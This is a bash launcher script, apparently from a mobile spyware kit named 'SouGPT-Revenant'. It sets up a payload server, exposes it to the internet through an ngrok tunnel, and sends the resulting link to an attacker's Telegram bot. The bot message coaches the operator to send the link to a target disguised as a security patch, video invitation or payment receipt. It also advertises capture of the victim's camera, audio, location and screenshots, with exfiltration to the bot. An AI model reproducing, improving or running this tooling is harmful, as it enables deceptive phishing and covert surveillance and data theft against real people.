#!/bin/bash

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

echo -e "${YELLOW}[+] SouGPT-Revenant Payload Launcher${NC}"
echo -e "${YELLOW}[+] Initializing...${NC}"

# Kill existing processes
pkill -f "python.*payload_generator" 2>/dev/null
pkill -f ngrok 2>/dev/null
sleep 2

# Check if ngrok installed
if ! command -v ngrok &> /dev/null; then
    echo -e "${RED}[!] ngrok not found. Installing...${NC}"
    wget -q https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.zip
    unzip -q ngrok-v3-stable-linux-amd64.zip
    chmod +x ngrok
    mv ngrok /data/data/com.termux/files/usr/bin/ 2>/dev/null || mv ngrok /usr/local/bin/ 2>/dev/null
    rm ngrok-v3-stable-linux-amd64.zip
    echo -e "${GREEN}[+] ngrok installed${NC}"
fi

# Check if python installed
if ! command -v python &> /dev/null; then
    echo -e "${RED}[!] Python not found. Installing...${NC}"
    pkg install python -y 2>/dev/null || apt-get install python3 -y 2>/dev/null
fi

# Install python dependencies
echo -e "${YELLOW}[+] Installing Python dependencies...${NC}"
pip install flask requests python-telegram-bot 2>/dev/null
pip3 install flask requests python-telegram-bot 2>/dev/null

# Get bot token and chat ID if not set
if ! grep -q "YOUR_BOT_TOKEN" payload_generator.py 2>/dev/null; then
    echo -e "${GREEN}[+] Bot token already configured${NC}"
else
    echo -e "${YELLOW}[!] Please enter your Telegram Bot Token:${NC}"
    read -r BOT_TOKEN
    echo -e "${YELLOW}[!] Please enter your Chat ID:${NC}"
    read -r CHAT_ID
    
    sed -i "s/YOUR_BOT_TOKEN/$BOT_TOKEN/g" payload_generator.py
    sed -i "s/YOUR_CHAT_ID/$CHAT_ID/g" payload_generator.py
    echo -e "${GREEN}[+] Bot configured${NC}"
fi

# Start payload generator in background
echo -e "${YELLOW}[+] Starting payload generator on port 8080...${NC}"
python payload_generator.py &
PYTHON_PID=$!
sleep 3

# Check if payload generator is running
if ! kill -0 $PYTHON_PID 2>/dev/null; then
    echo -e "${RED}[!] Failed to start payload generator${NC}"
    exit 1
fi
echo -e "${GREEN}[+] Payload generator running (PID: $PYTHON_PID)${NC}"

# Start ngrok
echo -e "${YELLOW}[+] Starting ngrok tunnel...${NC}"
ngrok http 8080 --log=stdout > ngrok.log 2>&1 &
NGROK_PID=$!
sleep 5

# Get ngrok URL
NGROK_URL=""
MAX_RETRIES=10
RETRY=0

while [ -z "$NGROK_URL" ] && [ $RETRY -lt $MAX_RETRIES ]; do
    NGROK_URL=$(curl -s http://localhost:4040/api/tunnels | python3 -c "import sys,json; d=json.load(sys.stdin); print(d['tunnels'][0]['public_url'])" 2>/dev/null)
    RETRY=$((RETRY+1))
    sleep 1
done

if [ -z "$NGROK_URL" ]; then
    echo -e "${RED}[!] Failed to get ngrok URL${NC}"
    echo -e "${YELLOW}[+] Check ngrok.log for details${NC}"
    exit 1
fi

echo -e "${GREEN}[+] Ngrok tunnel established${NC}"
echo -e "${GREEN}[+] PAYLOAD URL: $NGROK_URL${NC}"
echo "$NGROK_URL" > payload_link.txt

# Send link to Telegram
echo -e "${YELLOW}[+] Sending link to Telegram...${NC}"
BOT_TOKEN=$(grep "BOT_TOKEN =" payload_generator.py | head -1 | cut -d'"' -f2)
CHAT_ID=$(grep "CHAT_ID =" payload_generator.py | head -1 | cut -d'"' -f2)

python3 -c "
import requests
import time

BOT_TOKEN = '$BOT_TOKEN'
CHAT_ID = '$CHAT_ID'
LINK = '$NGROK_URL'

msg = f'''🔗 ACTIVE PAYLOAD LINK
  
{LINK}

Send to target disguised as:
• 'Critical security patch'
• 'Video invitation' 
• 'Payment receipt'
• 'System update required'

━━━━━━━━━━━━━━━━━━━━━
📍 Captures: Front Camera, Audio, Location, Screenshots
📡 Data exfiltration to this bot
⏱️ Active until tunnel closed
━━━━━━━━━━━━━━━━━━━━━'''

try:
    r = requests.post(f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage', 
                      json={'chat_id': CHAT_ID, 'text': msg}, timeout=5)
    print('[+] Link sent to Telegram')
except Exception as e:
    print(f'[-] Failed to send: {e}')
" 2>/dev/null

echo -e "${GREEN}[+] Link saved to payload_link.txt${NC}"
echo ""
echo -e "${GREEN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "${GREEN}  PAYLOAD ACTIVE AND READY${NC}"
echo -e "${GREEN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "${YELLOW}URL: $NGROK_URL${NC}"
echo -e "${YELLOW}File: payload_link.txt${NC}"
echo ""
echo -e "${RED}Press Ctrl+C to stop all processes${NC}"
echo ""

# Wait for user interrupt
trap 'echo -e "\n${YELLOW}[+] Stopping...${NC}"; kill $PYTHON_PID $NGROK_PID 2>/dev/null; exit 0' INT

while true; do
    sleep 1
done
